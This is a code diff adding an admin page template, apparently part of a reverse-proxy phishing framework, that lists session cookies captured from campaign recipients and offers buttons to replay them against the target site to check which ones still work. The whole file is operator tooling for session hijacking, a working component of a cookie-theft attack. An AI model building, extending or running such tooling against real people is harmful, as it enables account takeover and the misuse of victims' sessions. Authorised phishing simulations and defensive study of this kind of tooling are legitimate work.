@@ -1,0 +1,173 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">CAPTURED COOKIES</h1>
+    <div class="flex gap-3">
+      <form method="post" action="{{ url_for('campaigns_admin.api_validate_all_cookies', cid=campaign.id) }}" class="inline" id="validate-all-form">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <button type="submit" class="px-4 py-2 brutal-btn-red font-mono-brutal text-xs" id="validate-all-btn">VALIDATE ALL</button>
+      </form>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">CAMPAIGN INFO</a>
+      <a href="{{ url_for('admin_campaign_proxy_config', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">BACK TO PROXY CONFIG</a>
+    </div>
+  </div>
+
+  <div class="brutal-card p-6 mb-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-2">{{ campaign.name }}</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400">
+      Cookies captured from proxied requests and responses.
+      Enable capture by setting <code>capture_cookies: true</code> in the proxy campaign config.
+    </p>
+    {% if cookies %}
+    <div class="mt-3 flex gap-4 text-xs font-mono-brutal">
+      <span>TOTAL: <span class="font-bold">{{ cookies | length }}</span></span>
+      <span>VALID: <span class="font-bold text-brutal-emerald">{{ cookies | selectattr('is_valid', 'equalto', true) | list | length }}</span></span>
+      <span>INVALID: <span class="font-bold text-brutal-red">{{ cookies | selectattr('is_valid', 'equalto', false) | list | length }}</span></span>
+      <span>UNTESTED: <span class="font-bold text-gray-500">{{ cookies | selectattr('is_valid', 'none') | list | length }}</span></span>
+    </div>
+    {% endif %}
+  </div>
+
+  <!-- Validate all result banner -->
+  <div id="validate-result" class="hidden mb-6 border-4 border-pure-black dark:border-stark-white bg-[var(--dj-card)] p-4 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
+    <div class="font-mono-brutal text-sm font-bold" id="validate-result-text"></div>
+  </div>
+
+  <div class="brutal-card p-6">
+    <div class="overflow-x-auto">
+      <table class="w-full text-sm font-mono-brutal min-w-[1100px]">
+        <thead class="border-b-2 border-pure-black dark:border-stark-white">
+          <tr>
+            <th class="text-left py-2">Captured At</th>
+            <th class="text-left py-2">Source</th>
+            <th class="text-left py-2">Name</th>
+            <th class="text-left py-2">Value</th>
+            <th class="text-left py-2">Domain</th>
+            <th class="text-left py-2">Path</th>
+            <th class="text-left py-2">Recipient</th>
+            <th class="text-left py-2">Valid</th>
+            <th class="text-left py-2">Validated</th>
+            <th class="text-left py-2">Error</th>
+            <th class="text-left py-2">Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for c in cookies %}
+          <tr class="border-b border-gray-300 dark:border-gray-700" id="cookie-row-{{ c.id }}">
+            <td class="py-2 whitespace-nowrap">{{ c.captured_at.strftime('%Y-%m-%d %H:%M:%S') if c.captured_at else '-' }}</td>
+            <td class="py-2">
+              <span class="px-1.5 py-0.5 border border-gray-300 dark:border-gray-700 text-xs">{{ c.source }}</span>
+            </td>
+            <td class="py-2 font-bold">{{ c.cookie_name }}</td>
+            <td class="py-2 break-all max-w-[200px] font-mono text-xs">{{ c.cookie_value[:50] }}{% if c.cookie_value|length > 50 %}...{% endif %}</td>
+            <td class="py-2">{{ c.cookie_domain or '-' }}</td>
+            <td class="py-2">{{ c.cookie_path or '/' }}</td>
+            <td class="py-2 text-xs">{{ c.recipient_token[:12] if c.recipient_token else '-' }}...</td>
+            <td class="py-2" id="valid-{{ c.id }}">
+              {% if c.is_valid is none %}
+                <span class="text-gray-500">UNTESTED</span>
+              {% elif c.is_valid %}
+                <span class="text-brutal-emerald font-bold">VALID</span>
+              {% else %}
+                <span class="text-brutal-red font-bold">INVALID</span>
+              {% endif %}
+            </td>
+            <td class="py-2 whitespace-nowrap text-xs">{{ c.validated_at.strftime('%m-%d %H:%M') if c.validated_at else '-' }}</td>
+            <td class="py-2 break-all max-w-[200px] text-xs text-gray-500">{{ c.validation_error or '-' }}</td>
+            <td class="py-2">
+              <button type="button"
+                      class="px-3 py-1 border-2 border-pure-black dark:border-stark-white font-bold hover:bg-pure-black hover:text-stark-white dark:hover:bg-stark-white dark:hover:text-pure-black transition-all text-xs validate-cookie-btn"
+                      data-id="{{ c.id }}"
+                      data-url="{{ url_for('campaigns_admin.api_validate_captured_cookie', cid=campaign.id, cookie_id=c.id) }}"
+                      data-csrf="{{ csrf_token() }}">
+                VALIDATE
+              </button>
+            </td>
+          </tr>
+          {% else %}
+          <tr><td colspan="11" class="py-4 text-gray-500 dark:text-gray-400">No cookies captured yet.</td></tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.querySelectorAll('.validate-cookie-btn').forEach(function(btn) {
+  btn.addEventListener('click', async function() {
+    var url = btn.dataset.url;
+    var csrf = btn.dataset.csrf;
+    var id = btn.dataset.id;
+    btn.disabled = true;
+    btn.textContent = 'CHECKING...';
+    btn.className = btn.className.replace('border-pure-black', 'border-brutal-amber');
+    try {
+      var resp = await fetch(url, {
+        method: 'POST',
+        headers: { 'X-CSRFToken': csrf, 'Accept': 'application/json' },
+        credentials: 'same-origin'
+      });
+      var data = await resp.json();
+      var validCell = document.getElementById('valid-' + id);
+      if (data.valid) {
+        btn.textContent = 'VALID';
+        btn.className = btn.className.replace('border-brutal-amber', 'border-brutal-emerald');
+        btn.className += ' bg-brutal-emerald text-white';
+        validCell.innerHTML = '<span class="text-brutal-emerald font-bold">VALID</span>';
+      } else {
+        btn.textContent = 'INVALID';
+        btn.className = btn.className.replace('border-brutal-amber', 'border-brutal-red');
+        btn.className += ' bg-brutal-red text-white';
+        validCell.innerHTML = '<span class="text-brutal-red font-bold">INVALID</span>';
+      }
+    } catch(err) {
+      btn.textContent = 'ERROR';
+      btn.disabled = false;
+      btn.className = btn.className.replace('border-brutal-amber', 'border-brutal-red');
+    }
+  });
+});
+
+document.getElementById('validate-all-form')?.addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('validate-all-btn');
+  var result = document.getElementById('validate-result');
+  var resultText = document.getElementById('validate-result-text');
+  btn.disabled = true;
+  btn.textContent = 'VALIDATING ALL...';
+  result.classList.remove('hidden');
+  result.className = result.className.replace('border-brutal-red', 'border-brutal-amber');
+  resultText.textContent = 'Replaying all cookies against target...';
+  resultText.className = 'font-mono-brutal text-sm font-bold text-brutal-amber';
+
+  try {
+    var resp = await fetch(this.action, {
+      method: 'POST',
+      headers: { 'X-CSRFToken': '{{ csrf_token() }}', 'Accept': 'application/json' },
+      credentials: 'same-origin'
+    });
+    var data = await resp.json();
+    resultText.textContent = '[DONE] Total: ' + data.total + ' | Valid: ' + data.valid + ' | Invalid: ' + data.invalid;
+    resultText.className = 'font-mono-brutal text-sm font-bold text-brutal-emerald';
+    setTimeout(function() { window.location.reload(); }, 1500);
+  } catch(err) {
+    resultText.textContent = '[ERROR] Validation request failed: ' + err.message;
+    resultText.className = 'font-mono-brutal text-sm font-bold text-brutal-red';
+    btn.disabled = false;
+    btn.textContent = 'VALIDATE ALL';
+  }
+});
+</script>
+{% endblock %}
